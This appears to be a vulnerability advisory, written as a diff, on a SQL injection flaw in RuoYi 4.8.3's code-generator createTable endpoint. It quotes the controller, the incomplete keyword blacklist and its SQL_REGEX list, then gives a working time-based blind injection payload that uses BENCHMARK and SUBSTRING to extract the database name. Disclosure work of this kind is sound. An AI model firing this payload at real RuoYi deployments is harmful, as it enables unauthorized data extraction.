@@ -1,0 +1,57 @@
+RuoYi-4.8.3 and before has a SQL injection vulnerability in the `/tool/gen/createTable` route under `com/ruoyi/generator/controller/GenController` on the backend.
+The relevant code is shown below:
+
+public AjaxResult create(String sql)
+{
+    try
+    {
+        SqlUtil.filterKeyword(sql);
+        List<SQLStatement> sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);
+        List<String> tableNames = new ArrayList<>();
+        for (SQLStatement sqlStatement : sqlStatements)
+        {
+            if (sqlStatement instanceof MySqlCreateTableStatement)
+            {
+                MySqlCreateTableStatement createTableStatement = (MySqlCreateTableStatement) sqlStatement;
+                if (genTableService.createTable(createTableStatement.toString()))
+                {
+                    String tableName = createTableStatement.getTableName().replaceAll("`", "");
+                    tableNames.add(tableName);
+                }
+            }
+        }
+        List<GenTable> tableList = genTableService.selectDbTableListByNames(tableNames.toArray(new String[tableNames.size()]));
+        String operName = Convert.toStr(PermissionUtils.getPrincipalProperty("loginName"));
+        genTableService.importGenTable(tableList, operName);
+        return AjaxResult.success();
+    }
+    catch (Exception e)
+    {
+        logger.error(e.getMessage(), e);
+        return AjaxResult.error("创建表结构异常");
+    }
+}
+Filter function:
+public static void filterKeyword(String value)
+{
+    if (StringUtils.isEmpty(value))
+    {
+        return;
+    }
+    String normalizedValue = value.replaceAll("\\p{Z}|\\s", "");
+    String[] sqlKeywords = StringUtils.split(SQL_REGEX, "\\|");
+    for (String sqlKeyword : sqlKeywords)
+    {
+        if (StringUtils.indexOfIgnoreCase(normalizedValue, sqlKeyword) > -1)
+        {
+             throw new UtilException("请求参数包含敏感关键词'" + sqlKeyword + "'，可能存在安全风险");
+        }
+    }
+}
+
+Filtered keyword list:
+public static String SQL_REGEX = "\u000B|%0A|and |extractvalue|updatexml|sleep|information_schema|exec |insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |or |union |like |+|/*|user()";
+
+Although there is a blacklist filter, it is incomplete. It matches `select ` (with a trailing space) instead of the standalone keyword `select`. Keywords such as `Benchmark` are not filtered, so bypass methods exist. The payload is as follows:
+CREATE TABLE {table_name} AS SELECT 1 FROM sys_user WHERE 1=1 AND SUBSTRING(database(),{pos},1)='{char}'AND BENCHMARK(200000000,MD5(1))LIMIT 1;
+
